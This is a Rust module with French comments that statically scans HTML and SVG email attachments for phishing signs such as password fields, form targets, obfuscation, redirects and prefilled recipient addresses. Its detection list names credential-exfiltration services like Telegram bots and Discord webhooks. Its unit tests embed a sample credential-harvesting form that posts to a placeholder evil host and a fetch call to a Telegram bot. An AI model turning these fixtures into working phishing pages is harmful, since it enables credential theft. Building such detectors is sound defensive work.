//! Analyse statique des pièces jointes HTML et SVG (FR-047) : les pages de phishing envoyées en
//! pièce jointe s'ouvrent en local, hors de portée des filtres d'URL. On y cherche le faux
//! formulaire, l'endroit où partent les identifiants, l'obfuscation et la redirection.
//! Rien n'est exécuté : lecture du texte seulement.

use base64::Engine;
use mf_core::{FormInfo, HtmlAttachmentReport};
use regex::Regex;
use std::sync::LazyLock;

/// Base64 standard, remplissage `=` facultatif.
const LENIENT: base64::engine::GeneralPurpose = base64::engine::GeneralPurpose::new(
    &base64::alphabet::STANDARD,
    base64::engine::GeneralPurposeConfig::new()
        .with_decode_padding_mode(base64::engine::DecodePaddingMode::Indifferent),
);

/// Taille maximale analysée (les pages de phishing font rarement plus de quelques centaines de Ko).
const MAX_TEXT: usize = 4 * 1024 * 1024;
/// Charges `atob("…")` décodées et réanalysées au plus.
const MAX_PAYLOADS: usize = 8;

fn re(p: &str) -> Option<Regex> {
    Regex::new(p).ok()
}

static PASSWORD: LazyLock<Option<Regex>> = LazyLock::new(|| {
    re(
        r#"(?i)<input\b[^>]*\btype\s*=\s*["']?password|\.type\s*=\s*["']password["']|type:\s*["']password["']"#,
    )
});
static FORM: LazyLock<Option<Regex>> = LazyLock::new(|| re(r"(?is)<form\b([^>]*)>"));
static ATTR_ACTION: LazyLock<Option<Regex>> =
    LazyLock::new(|| re(r#"(?i)\baction\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#));
static ATTR_METHOD: LazyLock<Option<Regex>> =
    LazyLock::new(|| re(r#"(?i)\bmethod\s*=\s*["']?([a-z]+)"#));
static ATOB: LazyLock<Option<Regex>> =
    LazyLock::new(|| re(r#"(?i)atob\(\s*["'`]([A-Za-z0-9+/=\s]{16,})["'`]\s*\)"#));
static LONG_B64: LazyLock<Option<Regex>> = LazyLock::new(|| re(r"[A-Za-z0-9+/]{800,}={0,2}"));
static HEX_ESC: LazyLock<Option<Regex>> = LazyLock::new(|| re(r"(?:\\x[0-9a-fA-F]{2}){40,}"));
static META_REFRESH: LazyLock<Option<Regex>> = LazyLock::new(|| {
    re(
        r#"(?i)<meta\b[^>]*http-equiv\s*=\s*["']?refresh[^>]*content\s*=\s*["']?\s*\d+\s*;\s*url\s*=\s*([^"'>\s]+)"#,
    )
});
static JS_LOCATION: LazyLock<Option<Regex>> = LazyLock::new(|| {
    re(
        r#"(?i)(?:window\.|document\.|top\.|self\.)?location(?:\.href)?\s*(?:=|\.replace\(|\.assign\()\s*["'`]([^"'`]{4,})["'`]"#,
    )
});
static EMAIL: LazyLock<Option<Regex>> =
    LazyLock::new(|| re(r"(?i)[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}"));

/// Services d'exfiltration fréquents dans les kits de phishing.
const EXFIL: [(&str, &str); 14] = [
    ("api.telegram.org/bot", "bot Telegram"),
    ("discord.com/api/webhooks", "webhook Discord"),
    ("discordapp.com/api/webhooks", "webhook Discord"),
    ("hooks.slack.com", "webhook Slack"),
    ("formspree.io", "Formspree"),
    ("formsubmit.co", "FormSubmit"),
    ("submit-form.com", "Submit-Form"),
    ("getform.io", "Getform"),
    ("webhook.site", "webhook.site"),
    ("script.google.com/macros", "Google Apps Script"),
    ("pipedream.net", "Pipedream"),
    ("workers.dev", "Cloudflare Workers"),
    ("ngrok", "tunnel ngrok"),
    ("api.ipify.org", "géolocalisation de la victime (ipify)"),
];

/// Marqueurs d'obfuscation : (motif, libellé).
const OBFUSCATION: [(&str, &str); 9] = [
    ("eval(", "eval()"),
    ("atob(", "décodage base64 atob()"),
    ("unescape(", "unescape()"),
    ("fromcharcode", "String.fromCharCode"),
    ("document.write(", "document.write()"),
    ("decodeuricomponent(escape", "decodeURIComponent(escape())"),
    ("cryptojs", "chiffrement CryptoJS"),
    ("new function(", "new Function()"),
    ("_0x", "variables _0x (javascript-obfuscator)"),
];

fn push(v: &mut Vec<String>, s: impl Into<String>) {
    let s = s.into();
    if !v.contains(&s) && v.len() < 20 {
        v.push(s);
    }
}

fn scan(
    text: &str,
    recipients: &[String],
    r: &mut HtmlAttachmentReport,
    payloads: &mut Vec<String>,
) {
    let lower = text.to_ascii_lowercase();
    if let Some(p) = PASSWORD.as_ref() {
        r.password_fields += u32::try_from(p.find_iter(text).count()).unwrap_or(u32::MAX);
    }
    if let (Some(form), Some(act), Some(meth)) =
        (FORM.as_ref(), ATTR_ACTION.as_ref(), ATTR_METHOD.as_ref())
    {
        for c in form.captures_iter(text).take(20) {
            let attrs = c.get(1).map_or("", |m| m.as_str());
            let action = act
                .captures(attrs)
                .and_then(|a| a.get(1).or(a.get(2)).or(a.get(3)))
                .map(|m| m.as_str().trim().to_string())
                .filter(|a| !a.is_empty() && a != "#");
            let method = meth
                .captures(attrs)
                .and_then(|m| m.get(1))
                .map_or_else(|| "get".to_string(), |m| m.as_str().to_ascii_lowercase());
            let f = FormInfo { method, action };
            if !r.forms.contains(&f) {
                r.forms.push(f);
            }
        }
    }
    for (needle, label) in EXFIL {
        if lower.contains(needle) {
            push(&mut r.exfiltration, label);
        }
    }
    if (lower.contains("fetch(")
        || lower.contains("xmlhttprequest")
        || lower.contains("$.ajax")
        || lower.contains("$.post")
        || lower.contains("sendbeacon"))
        && r.password_fields > 0
    {
        push(
            &mut r.exfiltration,
            "envoi en arrière-plan (fetch / XMLHttpRequest / ajax)",
        );
    }
    for (needle, label) in OBFUSCATION {
        if lower.contains(needle) {
            push(&mut r.obfuscation, label);
        }
    }
    if LONG_B64.as_ref().is_some_and(|x| x.is_match(text)) {
        push(&mut r.obfuscation, "longue chaîne base64");
    }
    if HEX_ESC.as_ref().is_some_and(|x| x.is_match(text)) {
        push(&mut r.obfuscation, "chaîne en échappements \\x");
    }
    if let Some(m) = META_REFRESH.as_ref() {
        for c in m.captures_iter(text).take(5) {
            if let Some(u) = c.get(1) {
                push(&mut r.redirects, format!("meta refresh → {}", u.as_str()));
            }
        }
    }
    if let Some(j) = JS_LOCATION.as_ref() {
        for c in j.captures_iter(text).take(5) {
            if let Some(u) = c.get(1) {
                push(
                    &mut r.redirects,
                    format!("window.location → {}", u.as_str()),
                );
            }
        }
    }
    if let Some(e) = EMAIL.as_ref() {
        for m in e.find_iter(text) {
            let addr = m.as_str().to_ascii_lowercase();
            if recipients.contains(&addr) {
                push(&mut r.recipient_prefill, addr);
            }
        }
    }
    // Adresse du destinataire encodée en base64 (fréquent : `#dmljdGltQC4uLg==`).
    for rcpt in recipients {
        let b = base64::engine::general_purpose::STANDARD.encode(rcpt.as_bytes());
        let b = b.trim_end_matches('=');
        if b.len() > 8 && text.contains(b) {
            push(&mut r.recipient_prefill, format!("{rcpt} (en base64)"));
        }
    }
    if let Some(a) = ATOB.as_ref() {
        for c in a.captures_iter(text) {
            if payloads.len() >= MAX_PAYLOADS {
                break;
            }
            let b64: String = c
                .get(1)
                .map_or("", |m| m.as_str())
                .split_whitespace()
                .collect();
            if let Ok(bytes) = LENIENT.decode(&b64) {
                let s = String::from_utf8_lossy(&bytes).into_owned();
                if s.chars()
                    .filter(|c| c.is_control() && !c.is_whitespace())
                    .count()
                    * 10
                    < s.len()
                {
                    payloads.push(s);
                }
            }
        }
    }
}

/// Texte de la pièce jointe et des charges `atob()` décodées (pour l'extraction d'URL).
pub struct Analysis {
    pub report: HtmlAttachmentReport,
    pub texts: Vec<String>,
}

/// Analyse une pièce HTML/SVG ; `recipients` = adresses des destinataires, en minuscules.
pub fn analyze(data: &[u8], recipients: &[String]) -> Analysis {
    let slice = &data[..data.len().min(MAX_TEXT)];
    let text = if slice.len() >= 2 && (slice[0] == 0xFF && slice[1] == 0xFE) {
        let u: Vec<u16> = slice[2..]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&u)
    } else {
        String::from_utf8_lossy(slice).into_owned()
    };
    let mut report = HtmlAttachmentReport::default();
    let mut payloads = Vec::new();
    scan(&text, recipients, &mut report, &mut payloads);
    let mut texts = vec![text];
    let mut i = 0;
    while i < payloads.len() {
        let p = payloads[i].clone();
        scan(&p, recipients, &mut report, &mut payloads);
        texts.push(p);
        i += 1;
    }
    report.decoded_payloads = u32::try_from(texts.len() - 1).unwrap_or(0);
    // Une adresse trouvée en clair rend inutile sa mention « en base64 ».
    let plain: Vec<String> = report
        .recipient_prefill
        .iter()
        .filter(|a| !a.ends_with(" (en base64)"))
        .cloned()
        .collect();
    report.recipient_prefill.retain(|a| {
        a.strip_suffix(" (en base64)")
            .is_none_or(|x| !plain.iter().any(|p| p == x))
    });
    Analysis { report, texts }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn credential_page() {
        let inner = r#"<form method="POST" action="https://collect.evil.example/p.php"><input type="password" name="pw"></form><script>fetch("https://api.telegram.org/bot123:ABC/sendMessage")</script>"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner);
        let html = format!(
            r#"<html><body><script>document.write(atob("{b64}"));</script><input value="victim@victim.example"></body></html>"#
        );
        let a = analyze(html.as_bytes(), &["victim@victim.example".to_string()]);
        let r = a.report;
        assert_eq!(r.password_fields, 1);
        assert_eq!(r.decoded_payloads, 1);
        assert_eq!(
            r.forms[0].action.as_deref(),
            Some("https://collect.evil.example/p.php")
        );
        assert_eq!(r.forms[0].method, "post");
        assert!(r.exfiltration.iter().any(|e| e == "bot Telegram"));
        assert!(r.obfuscation.iter().any(|o| o.contains("atob")));
        assert_eq!(r.recipient_prefill, vec!["victim@victim.example"]);
        assert!(a.texts[1].contains("collect.evil.example"));
    }

    #[test]
    fn redirect_page() {
        let r = analyze(
            br#"<meta http-equiv="refresh" content="0; url=https://evil.example/a"><script>window.location.href = "https://evil.example/b";</script>"#,
            &[],
        )
        .report;
        assert_eq!(r.redirects.len(), 2);
        assert_eq!(r.password_fields, 0);
        assert!(r.exfiltration.is_empty());
    }

    #[test]
    fn recipient_in_base64_fragment() {
        let r = analyze(
            b"<a href='https://x.example/#dmljdGltQHZpY3RpbS5leGFtcGxl'>",
            &["victim@victim.example".into()],
        )
        .report;
        assert_eq!(r.recipient_prefill.len(), 1);
    }
}
